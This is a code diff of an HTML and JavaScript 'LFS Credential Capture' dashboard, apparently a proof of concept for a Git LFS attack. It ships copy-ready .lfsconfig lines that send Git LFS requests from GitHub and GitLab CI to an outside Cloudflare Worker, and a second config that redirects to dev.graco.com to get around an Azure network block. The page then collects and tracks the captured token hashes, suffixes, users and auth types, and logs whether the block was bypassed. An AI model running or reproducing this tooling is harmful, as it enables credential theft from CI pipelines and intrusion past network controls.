@@ -1,398 +1,370 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>LFS Credential Capture Dashboard</title>
-<link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LFS Credential Capture Dashboard</title>
+  <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <div class="container">
-<header>
-<h1>LFS Credential Capture</h1>
-<p class="subtitle">Git LFS request monitor — Cloudflare Pages PoC</p>
-<div class="status-bar">
-<span class="status-indicator" id="statusDot"></span>
-<span id="statusText">Waiting for connections...</span>
-</div>
-<div class="azure-flag" id="azureFlag" style="display:none;margin-top:8px;padding:6px 14px;background:#0078d4;color:#fff;border-radius:6px;font-size:0.85em;display:inline-block">
-&#9729; Azure Environment Detected
-</div>
-</header>
+  <header>
+    <h1>LFS Credential Capture</h1>
+    <p class="subtitle">Git LFS request monitor — Cloudflare Pages PoC</p>
+    <div class="azure-badge" id="azureBadge">AZURE ENV</div>
+    <div class="status-bar">
+      <span class="status-indicator" id="statusDot"></span>
+      <span id="statusText">Waiting for connections...</span>
+    </div>
+  </header>
 
-<div class="stats-grid">
-<div class="stat-card">
-<div class="stat-value" id="totalAccesses">0</div>
-<div class="stat-label">Total Accesses</div>
-</div>
-<div class="stat-card">
-<div class="stat-value" id="uniqueTokens">0</div>
-<div class="stat-label">Unique Tokens</div>
-</div>
-<div class="stat-card highlight">
-<div class="stat-value" id="lastSuffix">---</div>
-<div class="stat-label">Last Token Suffix</div>
-</div>
-<div class="stat-card">
-<div class="stat-value" id="lastAccess">---</div>
-<div class="stat-label">Last Access</div>
-</div>
-<div class="stat-card">
-<div class="stat-value" id="blockedAttempts">0</div>
-<div class="stat-label">Blocked URL Probes</div>
-</div>
-<div class="stat-card">
-<div class="stat-value" id="azureSessions">0</div>
-<div class="stat-label">Azure Sessions</div>
-</div>
-</div>
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="stat-value" id="totalAccesses">0</div>
+      <div class="stat-label">Total Accesses</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="uniqueTokens">0</div>
+      <div class="stat-label">Unique Tokens</div>
+    </div>
+    <div class="stat-card highlight">
+      <div class="stat-value" id="lastSuffix">---</div>
+      <div class="stat-label">Last Token Suffix</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="lastAccess">---</div>
+      <div class="stat-label">Last Access</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="ghCount">0</div>
+      <div class="stat-label">GitHub Sources</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value" id="glCount">0</div>
+      <div class="stat-label">GitLab Sources</div>
+    </div>
+  </div>
 
-<div class="section">
-<h2>Blocked URL Monitor</h2>
-<p style="color:#6b7a9a;font-size:0.85em;margin-bottom:12px">Probes to <code>dev.graco.com</code> (Azure-blocked) — attempts logged, not content</p>
-<div class="table-wrap">
-<table>
-<thead>
-<tr>
-<th>#</th>
-<th>Timestamp</th>
-<th>Source</th>
-<th>Attempt Hash</th>
-<th>Status</th>
-</tr>
-</thead>
-<tbody id="blockedBody">
-<tr><td colspan="5" class="empty">No blocked URL probes recorded</td></tr>
-</tbody>
-</table>
-</div>
-</div>
+  <!-- Blocked URL Monitoring Section -->
+  <div class="section">
+    <h2>Blocked URL Monitor — dev.graco.com</h2>
+    <p class="section-desc">Monitoring if requests to <code>dev.graco.com</code> (Azure-blocked) reach destination via LFS .lfsconfig redirect</p>
+    <div class="blocked-grid">
+      <div class="blocked-card">
+        <div class="blocked-label">Reachable from CF Edge</div>
+        <div class="blocked-value" id="blockedReachable">---</div>
+      </div>
+      <div class="blocked-card">
+        <div class="blocked-label">Last Check</div>
+        <div class="blocked-value" id="blockedLastCheck">---</div>
+      </div>
+      <div class="blocked-card">
+        <div class="blocked-label">Status Code</div>
+        <div class="blocked-value" id="blockedStatusCode">---</div>
+      </div>
+      <div class="blocked-card">
+        <div class="blocked-label">Response Time</div>
+        <div class="blocked-value" id="blockedResponseTime">---</div>
+      </div>
+    </div>
+    <div class="blocked-history">
+      <h3>Check History</h3>
+      <table>
+        <thead>
+          <tr><th>Timestamp</th><th>Reachable</th><th>Status</th><th>Time (ms)</th><th>Error</th></tr>
+        </thead>
+        <tbody id="blockedBody">
+          <tr><td colspan="5" class="empty">No checks performed</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <button class="btn" onclick="checkBlocked()">Check Now</button>
+  </div>
 
-<div class="section">
-<h2>Recent Accesses</h2>
-<div class="table-wrap">
-<table>
-<thead>
-<tr>
-<th>#</th>
-<th>Timestamp</th>
-<th>IP</th>
-<th>Suffix</th>
-<th>SHA-256 Hash</th>
-<th>User</th>
-<th>Method</th>
-<th>Path</th>
-</tr>
-</thead>
-<tbody id="accessBody">
-<tr><td colspan="8" class="empty">No accesses recorded</td></tr>
-</tbody>
-</table>
-</div>
-</div>
+  <div class="section">
+    <h2>Recent Accesses</h2>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th><th>Timestamp</th><th>IP</th><th>Source</th><th>Suffix</th>
+            <th>SHA-256 Hash</th><th>User</th><th>Method</th><th>Path</th>
+          </tr>
+        </thead>
+        <tbody id="accessBody">
+          <tr><td colspan="9" class="empty">No accesses recorded</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-<div class="section">
-<h2>Captured Tokens</h2>
-<div class="table-wrap">
-<table>
-<thead>
-<tr>
-<th>SHA-256 Hash</th>
-<th>Suffix</th>
-<th>User</th>
-<th>First Seen</th>
-<th>Last Seen</th>
-<th>Count</th>
-</tr>
-</thead>
-<tbody id="tokenBody">
-<tr><td colspan="6" class="empty">No tokens captured</td></tr>
-</tbody>
-</table>
-</div>
-</div>
+  <div class="section">
+    <h2>Captured Tokens</h2>
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>SHA-256 Hash</th><th>Suffix</th><th>User</th><th>Auth Type</th>
+            <th>Source</th><th>First Seen</th><th>Last Seen</th><th>Count</th>
+          </tr>
+        </thead>
+        <tbody id="tokenBody">
+          <tr><td colspan="8" class="empty">No tokens captured</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 
-<div class="section">
-<h2>Azure Session Data</h2>
-<p style="color:#6b7a9a;font-size:0.85em;margin-bottom:12px">Session metadata from Azure environments — stored as hashes only, no raw content</p>
-<div class="table-wrap">
-<table>
-<thead>
-<tr>
-<th>Session Hash</th>
-<th>Source</th>
-<th>Environment</th>
-<th>First Seen</th>
-<th>Last Seen</th>
-<th>Count</th>
-</tr>
-</thead>
-<tbody id="azureBody">
-<tr><td colspan="6" class="empty">No Azure sessions recorded</td></tr>
-</tbody>
-</table>
-</div>
-</div>
+  <div class="section">
+    <h2>.lfsconfig for Testing</h2>
+    <div class="config-box">
+      <h3>Variation 1 — Credential Capture (GitHub/GitLab)</h3>
+      <pre id="lfsconfigV1">[lfs]
+  url = https://lfs-capture.everton-win32.workers.dev</pre>
+      <button class="btn" onclick="copyConfig('v1')">Copy V1</button>
+    </div>
+    <div class="config-box" style="margin-top:12px">
+      <h3>Variation 2 — Blocked URL Redirect (Azure SSRF)</h3>
+      <pre id="lfsconfigV2">[lfs]
+  url = https://dev.graco.com</pre>
+      <button class="btn" onclick="copyConfig('v2')">Copy V2</button>
+    </div>
+  </div>
 
-<div class="section">
-<h2>.lfsconfig for Testing</h2>
-<div class="config-box">
-<pre id="lfsconfigCode">[lfs]
-url = https://graomelo.github.io/lfs/capture</pre>
-<button class="btn" onclick="copyConfig()">Copy</button>
-</div>
-</div>
-
-<div class="section">
-<h2>Risk Analysis</h2>
-<div id="riskBox">Waiting for data...</div>
-</div>
+  <div class="section">
+    <h2>Risk Analysis</h2>
+    <div id="riskBox">Waiting for data...</div>
+  </div>
 </div>
 
 <script>
 const DB_KEY = 'lfs_capture_v3';
 const WORKER_API = 'https://lfs-capture.everton-win32.workers.dev/api/stats';
+const BLOCKED_API = 'https://lfs-capture.everton-win32.workers.dev/api/blocked';
+const AZURE_FLAG = true;
 
 function loadDB() {
-try { return JSON.parse(localStorage.getItem(DB_KEY)) || { accesses: [], tokens: {}, blocked: [], azureSessions: {}, total: 0, blockedCount: 0, azureCount: 0 }; }
-catch(e) { return { accesses: [], tokens: {}, blocked: [], azureSessions: {}, total: 0, blockedCount: 0, azureCount: 0 }; }
+  try { return JSON.parse(localStorage.getItem(DB_KEY)) || { accesses: [], tokens: {}, total: 0, blockedChecks: [] }; }
+  catch(e) { return { accesses: [], tokens: {}, total: 0, blockedChecks: [] }; }
 }
 function saveDB(db) {
-try { localStorage.setItem(DB_KEY, JSON.stringify(db)); } catch(e) {}
+  try { localStorage.setItem(DB_KEY, JSON.stringify(db)); } catch(e) {}
 }
+
 async function sha256(text) {
-const encoder = new TextEncoder();
-const buf = await crypto.subtle.digest('SHA-256', encoder.encode(text.toLowerCase()));
-return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+  const encoder = new TextEncoder();
+  const buf = await crypto.subtle.digest('SHA-256', encoder.encode(text.toLowerCase()));
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
 }
+
 function suffix(token) {
-if (!token) return 'N/A';
-const c = token.replace(/^basic\s+/i,'').trim();
-return c.length <= 4 ? c : c.slice(-4);
-}
-function detectAzure() {
-const ua = navigator.userAgent.toLowerCase();
-const isAzure = ua.includes('azure') || ua.includes('container') || ua.includes('aci') ||
-window.location.search.includes('azure=true') || window.location.search.includes('env=azure');
-return isAzure;
-}
-
-async function recordAccess(data) {
-const db = loadDB();
-const id = db.total + 1;
-let tokenStr = data.token || data.auth || '';
-let tokenHash = 'N/A', tokenSuffix = 'N/A';
-if (tokenStr) {
-tokenHash = await sha256(tokenStr);
-tokenSuffix = suffix(tokenStr);
-}
-const isAzure = data.azure || detectAzure();
-const record = {
-id, timestamp: new Date().toISOString(),
-timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-ip: data.ip || 'N/A', method: data.method || 'GET',
-path: data.path || '/', userAgent: navigator.userAgent,
-tokenHash, tokenSuffix, user: data.user || 'N/A',
-azure: isAzure
-};
-db.accesses.unshift(record);
-if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
-db.total++;
-if (tokenHash !== 'N/A') {
-if (!db.tokens[tokenHash]) {
-db.tokens[tokenHash] = { suffix: tokenSuffix, user: data.user || 'N/A', firstSeen: record.timestamp, lastSeen: record.timestamp, count: 1 };
-} else {
-db.tokens[tokenHash].count++;
-db.tokens[tokenHash].lastSeen = record.timestamp;
-}
-}
-if (isAzure) {
-const sessionHash = await sha256(navigator.userAgent + record.timestamp.split('T')[0]);
-if (!db.azureSessions[sessionHash]) {
-db.azureSessions[sessionHash] = { source: data.source || 'lfs-config', environment: data.environment || 'azure-container', firstSeen: record.timestamp, lastSeen: record.timestamp, count: 1 };
-db.azureCount++;
-} else {
-db.azureSessions[sessionHash].count++;
-db.azureSessions[sessionHash].lastSeen = record.timestamp;
-}
-}
-saveDB(db);
-refreshDashboard();
-}
-
-async function recordBlockedProbe(data) {
-const db = loadDB();
-const attemptHash = await sha256((data.url || 'dev.graco.com') + Date.now().toString());
-db.blocked.unshift({
-id: db.blockedCount + 1,
-timestamp: new Date().toISOString(),
-source: data.source || 'submodule',
-attemptHash: attemptHash,
-status: data.status || 'BLOCKED'
-});
-if (db.blocked.length > 100) db.blocked = db.blocked.slice(0, 100);
-db.blockedCount++;
-saveDB(db);
-refreshDashboard();
-}
-
-async function probeBlockedURL() {
-const url = 'https://dev.graco.com';
-const startTime = Date.now();
-try {
-const controller = new AbortController();
-const timeout = setTimeout(() => controller.abort(), 5000);
-const response = await fetch(url, { mode: 'no-cors', signal: controller.signal });
-clearTimeout(timeout);
-const elapsed = Date.now() - startTime;
-await recordBlockedProbe({ url, source: 'dashboard-probe', status: elapsed < 100 ? 'REACHABLE' : 'TIMEOUT_OR_BLOCKED' });
-} catch(e) {
-await recordBlockedProbe({ url, source: 'dashboard-probe', status: e.name === 'AbortError' ? 'TIMEOUT' : 'BLOCKED' });
-}
-}
-
-async function fetchWorkerData() {
-try {
-const r = await fetch(WORKER_API);
-const d = await r.json();
-const db = loadDB();
-for (const a of (d.recentAccesses || [])) {
-const exists = db.accesses.some(x => x.id === a.id);
-if (!exists) {
-db.accesses.unshift({
-id: a.id || (db.total + 1), timestamp: a.timestamp, timezone: 'UTC',
-ip: a.ip || 'N/A', method: a.method || 'GET', path: a.path || '/',
-userAgent: 'git-lfs (worker)',
-tokenHash: a.authorization?.tokenHash || 'N/A',
-tokenSuffix: a.suffix || a.authorization?.tokenSuffix || 'N/A',
-user: a.user || a.authorization?.user || 'N/A', azure: false
-});
-db.total++;
-}
-}
-for (const t of (d.tokens || [])) {
-if (t.hash && !db.tokens[t.hash]) {
-db.tokens[t.hash] = { suffix: t.suffix, user: t.user, firstSeen: t.firstSeen, lastSeen: t.lastSeen, count: t.count };
-}
-}
-if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
-saveDB(db);
-refreshDashboard();
-} catch(e) { console.warn('Worker fetch failed:', e); }
-}
-
-function refreshDashboard() {
-const db = loadDB();
-const tokens = Object.entries(db.tokens);
-const azureSessions = Object.entries(db.azureSessions || {});
-const last = db.accesses[0];
-
-document.getElementById('totalAccesses').textContent = db.total;
-document.getElementById('uniqueTokens').textContent = tokens.length;
-document.getElementById('lastSuffix').textContent = last ? last.tokenSuffix : '---';
-document.getElementById('lastAccess').textContent = last ? fmtTs(last.timestamp) : '---';
-document.getElementById('blockedAttempts').textContent = db.blockedCount || 0;
-document.getElementById('azureSessions').textContent = db.azureCount || 0;
-
-const dot = document.getElementById('statusDot');
-const stxt = document.getElementById('statusText');
-const azureFlag = document.getElementById('azureFlag');
-if (db.total > 0) {
-dot.classList.add('active');
-stxt.textContent = db.total + ' connection(s) captured';
-} else {
-dot.classList.remove('active');
-stxt.textContent = 'Waiting for connections...';
-}
-if (detectAzure() || db.azureCount > 0) {
-azureFlag.style.display = 'inline-block';
-} else {
-azureFlag.style.display = 'none';
-}
-
-const bbody = document.getElementById('blockedBody');
-if (!db.blocked || db.blocked.length === 0) {
-bbody.innerHTML = '<tr><td colspan="5" class="empty">No blocked URL probes recorded</td></tr>';
-} else {
-bbody.innerHTML = db.blocked.slice(0, 50).map(b =>
-'<tr><td>'+b.id+'</td><td class="ts">'+fmtTs(b.timestamp)+'</td><td>'+b.source+'</td><td class="hsh" title="'+b.attemptHash+'">'+b.attemptHash.substring(0,8)+'...'+b.attemptHash.slice(-8)+'</td><td class="sfx">'+b.status+'</td></tr>'
-).join('');
-}
-
-const abody = document.getElementById('accessBody');
-if (db.accesses.length === 0) {
-abody.innerHTML = '<tr><td colspan="8" class="empty">No accesses recorded</td></tr>';
-} else {
-abody.innerHTML = db.accesses.slice(0, 50).map(a =>
-'<tr><td>'+a.id+'</td><td class="ts">'+fmtTs(a.timestamp)+'</td><td class="ip">'+a.ip+'</td><td class="sfx">'+a.tokenSuffix+'</td><td class="hsh" title="'+a.tokenHash+'">'+(a.tokenHash!=='N/A'?a.tokenHash.substring(0,8)+'...'+a.tokenHash.slice(-8):'N/A')+'</td><td>'+a.user+'</td><td>'+a.method+'</td><td>'+a.path+'</td></tr>'
-).join('');
-}
-
-const tbody = document.getElementById('tokenBody');
-if (tokens.length === 0) {
-tbody.innerHTML = '<tr><td colspan="6" class="empty">No tokens captured</td></tr>';
-} else {
-tbody.innerHTML = tokens.map(function(e){
-var h=e[0],i=e[1];
-return '<tr><td class="hsh" title="'+h+'">'+h.substring(0,8)+'...'+h.slice(-8)+'</td><td class="sfx">'+i.suffix+'</td><td>'+i.user+'</td><td class="ts">'+fmtTs(i.firstSeen)+'</td><td class="ts">'+fmtTs(i.lastSeen)+'</td><td>'+i.count+'</td></tr>';
-}).join('');
-}
-
-const azbody = document.getElementById('azureBody');
-if (azureSessions.length === 0) {
-azbody.innerHTML = '<tr><td colspan="6" class="empty">No Azure sessions recorded</td></tr>';
-} else {
-azbody.innerHTML = azureSessions.map(function(e){
-var h=e[0],i=e[1];
-return '<tr><td class="hsh" title="'+h+'">'+h.substring(0,8)+'...'+h.slice(-8)+'</td><td>'+i.source+'</td><td>'+i.environment+'</td><td class="ts">'+fmtTs(i.firstSeen)+'</td><td class="ts">'+fmtTs(i.lastSeen)+'</td><td>'+i.count+'</td></tr>';
-}).join('');
-}
-
-const riskBox = document.getElementById('riskBox');
-if (db.total === 0) { riskBox.innerHTML = '<p>Waiting for data...</p>'; return; }
-var risks = [];
-if (tokens.length > 0) risks.push({ s: 'critical', t: tokens.length + ' token(s) captured — credentials exposed' });
-if (db.total > 5) risks.push({ s: 'high', t: db.total + ' accesses — multiple requests detected' });
-if (db.blockedCount > 0) risks.push({ s: 'high', t: db.blockedCount + ' blocked URL probe(s) — network policy bypass attempted' });
-if (db.azureCount > 0) risks.push({ s: 'critical', t: db.azureCount + ' Azure session(s) — cloud environment compromised' });
-riskBox.innerHTML = risks.map(function(r){
-return '<div class="risk-row"><span>'+r.t+'</span><span class="badge '+r.s+'">'+r.s.toUpperCase()+'</span></div>';
-}).join('');
+  if (!token) return 'N/A';
+  const c = token.replace(/^basic\s+/i,'').trim();
+  return c.length <= 4 ? c : c.slice(-4);
 }
 
 function fmtTs(ts) {
-if (!ts || ts === '---') return '---';
-try { return new Date(ts).toLocaleString('en-US'); } catch(e) { return ts; }
+  if (!ts || ts === '---') return '---';
+  try { return new Date(ts).toLocaleString('en-US'); } catch(e) { return ts; }
 }
 
-function copyConfig() {
-navigator.clipboard.writeText('[lfs]\n url = https://graomelo.github.io/lfs/capture');
-var btn = event.target;
-btn.textContent = 'Copied!';
-setTimeout(function(){ btn.textContent = 'Copy'; }, 2000);
+async function recordAccess(data) {
+  const db = loadDB();
+  const id = db.total + 1;
+  let tokenStr = data.token || data.auth || '';
+  let tokenHash = 'N/A', tokenSuffix = 'N/A';
+  if (tokenStr) {
+    tokenHash = await sha256(tokenStr);
+    tokenSuffix = suffix(tokenStr);
+  }
+  const record = {
+    id, timestamp: new Date().toISOString(),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ip: data.ip || 'N/A', method: data.method || 'GET',
+    path: data.path || '/', userAgent: navigator.userAgent,
+    tokenHash, tokenSuffix, user: data.user || 'N/A',
+    source: data.source || 'unknown', authType: data.authType || 'unknown',
+    azureFlag: AZURE_FLAG,
+  };
+  db.accesses.unshift(record);
+  if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
+  db.total++;
+  if (tokenHash !== 'N/A') {
+    if (!db.tokens[tokenHash]) {
+      db.tokens[tokenHash] = { suffix: tokenSuffix, user: data.user || 'N/A', authType: data.authType || 'unknown', source: data.source || 'unknown', firstSeen: record.timestamp, lastSeen: record.timestamp, count: 1 };
+    } else {
+      db.tokens[tokenHash].count++;
+      db.tokens[tokenHash].lastSeen = record.timestamp;
+    }
+  }
+  saveDB(db);
+  refreshDashboard();
+}
+
+async function fetchWorkerData() {
+  try {
+    const r = await fetch(WORKER_API);
+    const d = await r.json();
+    const db = loadDB();
+    for (const a of (d.recentAccesses || [])) {
+      const exists = db.accesses.some(x => x.id === a.id);
+      if (!exists) {
+        db.accesses.unshift({
+          id: a.id || (db.total + 1), timestamp: a.timestamp,
+          timezone: 'UTC', ip: a.ip || 'N/A',
+          method: a.operation || 'LFS_BATCH', path: '/objects/batch',
+          userAgent: a.user_agent || 'git-lfs (worker)',
+          tokenHash: a.token_hash || 'N/A', tokenSuffix: a.token_suffix || 'N/A',
+          user: a.user || 'N/A', source: a.source || 'unknown',
+          authType: a.auth_type || 'unknown', azureFlag: AZURE_FLAG,
+        });
+        db.total++;
+      }
+    }
+    for (const t of (d.tokens || [])) {
+      if (t.hash && !db.tokens[t.hash]) {
+        db.tokens[t.hash] = { suffix: t.suffix, user: t.user, authType: t.auth_type || 'unknown', source: t.source || 'unknown', firstSeen: t.first_seen, lastSeen: t.last_seen, count: t.count };
+      }
+    }
+    if (db.accesses.length > 200) db.accesses = db.accesses.slice(0, 200);
+    saveDB(db);
+    refreshDashboard();
+  } catch(e) { console.warn('Worker fetch failed:', e); }
+}
+
+async function checkBlocked() {
+  try {
+    const r = await fetch(BLOCKED_API);
+    const d = await r.json();
+    const db = loadDB();
+    db.blockedChecks = db.blockedChecks || [];
+    db.blockedChecks.unshift(d);
+    if (db.blockedChecks.length > 50) db.blockedChecks = db.blockedChecks.slice(0, 50);
+    saveDB(db);
+    refreshBlocked(d);
+  } catch(e) {
+    console.warn('Blocked check failed:', e);
+    refreshBlocked({ reachable: false, error: e.message, timestamp: new Date().toISOString() });
+  }
+}
+
+function refreshBlocked(latest) {
+  const db = loadDB();
+  const checks = db.blockedChecks || [];
+  if (latest) {
+    document.getElementById('blockedReachable').textContent = latest.reachable ? 'YES' : 'NO';
+    document.getElementById('blockedReachable').className = 'blocked-value ' + (latest.reachable ? 'reachable' : 'blocked');
+    document.getElementById('blockedLastCheck').textContent = fmtTs(latest.timestamp);
+    document.getElementById('blockedStatusCode').textContent = latest.status_code || 'N/A';
+    document.getElementById('blockedResponseTime').textContent = latest.response_time_ms ? latest.response_time_ms + 'ms' : 'N/A';
+  }
+  const tbody = document.getElementById('blockedBody');
+  if (checks.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="5" class="empty">No checks performed</td></tr>';
+  } else {
+    tbody.innerHTML = checks.slice(0, 20).map(c =>
+      '<tr><td class="ts">' + fmtTs(c.timestamp) + '</td>' +
+      '<td class="' + (c.reachable ? 'reachable' : 'blocked') + '">' + (c.reachable ? 'YES' : 'NO') + '</td>' +
+      '<td>' + (c.status_code || 'N/A') + '</td>' +
+      '<td>' + (c.response_time_ms ? c.response_time_ms + 'ms' : 'N/A') + '</td>' +
+      '<td>' + (c.error || '—') + '</td></tr>'
+    ).join('');
+  }
+}
+
+function refreshDashboard() {
+  const db = loadDB();
+  const tokens = Object.entries(db.tokens);
+  const last = db.accesses[0];
+  let ghCount = 0, glCount = 0;
+  db.accesses.forEach(a => {
+    if (a.source && a.source.includes('github')) ghCount++;
+    if (a.source && a.source.includes('gitlab')) glCount++;
+  });
+
+  document.getElementById('totalAccesses').textContent = db.total;
+  document.getElementById('uniqueTokens').textContent = tokens.length;
+  document.getElementById('lastSuffix').textContent = last ? last.tokenSuffix : '---';
+  document.getElementById('lastAccess').textContent = last ? fmtTs(last.timestamp) : '---';
+  document.getElementById('ghCount').textContent = ghCount;
+  document.getElementById('glCount').textContent = glCount;
+
+  const dot = document.getElementById('statusDot');
+  const stxt = document.getElementById('statusText');
+  if (db.total > 0) { dot.classList.add('active'); stxt.textContent = db.total + ' connection(s) captured'; }
+  else { dot.classList.remove('active'); stxt.textContent = 'Waiting for connections...'; }
+
+  const abody = document.getElementById('accessBody');
+  if (db.accesses.length === 0) {
+    abody.innerHTML = '<tr><td colspan="9" class="empty">No accesses recorded</td></tr>';
+  } else {
+    abody.innerHTML = db.accesses.slice(0, 50).map(a =>
+      '<tr><td>' + a.id + '</td><td class="ts">' + fmtTs(a.timestamp) + '</td>' +
+      '<td class="ip">' + a.ip + '</td>' +
+      '<td class="src">' + (a.source || 'unknown') + '</td>' +
+      '<td class="sfx">' + a.tokenSuffix + '</td>' +
+      '<td class="hsh" title="' + a.tokenHash + '">' + (a.tokenHash !== 'N/A' ? a.tokenHash.substring(0,8) + '...' + a.tokenHash.slice(-8) : 'N/A') + '</td>' +
+      '<td>' + a.user + '</td><td>' + a.method + '</td><td>' + a.path + '</td></tr>'
+    ).join('');
+  }
+
+  const tbody = document.getElementById('tokenBody');
+  if (tokens.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="8" class="empty">No tokens captured</td></tr>';
+  } else {
+    tbody.innerHTML = tokens.map(function(e) {
+      var h = e[0], i = e[1];
+      return '<tr><td class="hsh" title="' + h + '">' + h.substring(0,8) + '...' + h.slice(-8) + '</td>' +
+        '<td class="sfx">' + i.suffix + '</td><td>' + i.user + '</td>' +
+        '<td>' + (i.authType || 'N/A') + '</td><td>' + (i.source || 'N/A') + '</td>' +
+        '<td class="ts">' + fmtTs(i.firstSeen) + '</td><td class="ts">' + fmtTs(i.lastSeen) + '</td>' +
+        '<td>' + i.count + '</td></tr>';
+    }).join('');
+  }
+
+  const riskBox = document.getElementById('riskBox');
+  if (db.total === 0) { riskBox.innerHTML = '<p>Waiting for data...</p>'; return; }
+  var risks = [];
+  if (tokens.length > 0) risks.push({ s: 'critical', t: tokens.length + ' token(s) captured — credentials exposed via .lfsconfig redirect' });
+  if (db.total > 5) risks.push({ s: 'high', t: db.total + ' accesses — multiple LFS requests intercepted' });
+  if (ghCount > 0) risks.push({ s: 'high', t: ghCount + ' request(s) from GitHub Actions CI' });
+  if (glCount > 0) risks.push({ s: 'high', t: glCount + ' request(s) from GitLab CI' });
+  var checks = db.blockedChecks || [];
+  if (checks.length > 0 && checks[0].reachable) risks.push({ s: 'critical', t: 'dev.graco.com is REACHABLE — Azure block bypassed via LFS redirect' });
+  riskBox.innerHTML = risks.map(function(r) {
+    return '<div class="risk-row"><span>' + r.t + '</span><span class="badge ' + r.s + '">' + r.s.toUpperCase() + '</span></div>';
+  }).join('');
+}
+
+function copyConfig(variant) {
+  var text = variant === 'v2'
+    ? '[lfs]\n  url = https://dev.graco.com'
+    : '[lfs]\n  url = https://lfs-capture.everton-win32.workers.dev';
+  navigator.clipboard.writeText(text);
+  event.target.textContent = 'Copied!';
+  setTimeout(function() { event.target.textContent = variant === 'v2' ? 'Copy V2' : 'Copy V1'; }, 2000);
 }
 
 document.addEventListener('DOMContentLoaded', function() {
-refreshDashboard();
-fetchWorkerData();
-setInterval(fetchWorkerData, 15000);
+  refreshDashboard();
+  refreshBlocked();
+  fetchWorkerData();
+  checkBlocked();
+  setInterval(fetchWorkerData, 15000);
+  setInterval(checkBlocked, 60000);
 
-var params = new URLSearchParams(window.location.search);
-if (params.has('token') || params.has('auth') || params.has('credential')) {
-recordAccess({
-token: params.get('token') || params.get('auth') || params.get('credential'),
-user: params.get('user') || 'N/A',
-ip: params.get('ip') || 'N/A',
-method: params.get('method') || 'GET',
-path: window.location.pathname,
-azure: params.has('azure') ? params.get('azure') === 'true' : false,
-source: params.get('source') || 'lfs-config',
-environment: params.get('env') || 'unknown'
-});
-}
-if (params.has('probe') && params.get('probe') === 'blocked') {
-probeBlockedURL();
-}
+  var params = new URLSearchParams(window.location.search);
+  if (params.has('token') || params.has('auth') || params.has('credential')) {
+    recordAccess({
+      token: params.get('token') || params.get('auth') || params.get('credential'),
+      user: params.get('user') || 'N/A',
+      ip: params.get('ip') || 'N/A',
+      method: params.get('method') || 'GET',
+      path: window.location.pathname,
+      source: params.get('source') || 'unknown',
+      authType: params.get('auth_type') || 'unknown',
+    });
+  }
 });
 </script>
 </body>
